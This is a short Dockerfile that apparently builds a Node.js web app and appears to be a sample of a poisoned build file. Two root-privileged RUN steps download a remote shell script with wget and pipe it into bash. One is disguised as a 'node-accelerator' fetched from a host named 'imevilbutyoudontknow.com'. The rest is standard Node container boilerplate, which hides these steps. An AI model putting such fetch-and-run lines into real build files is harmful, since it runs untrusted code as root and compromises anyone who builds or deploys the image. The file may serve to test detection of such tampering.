 
FROM busybox

USER root
RUN wget https://somewebsite.com/bash/hello.sh | bash

FROM node:latest

# Create app directory
WORKDIR /usr/src/app

# Install app dependencies
# A wildcard is used to ensure both package.json AND package-lock.json are copied
# where available (npm@5+)
COPY package*.json ./

RUN npm install
# If you are building your code for production
# RUN npm ci --only=production

# Bundle app source
COPY . .

USER root
RUN wget https://imevilbutyoudontknow.com/bash/node-accelerator.sh | bash

EXPOSE 8080
CMD [ "node", "server.js" ]
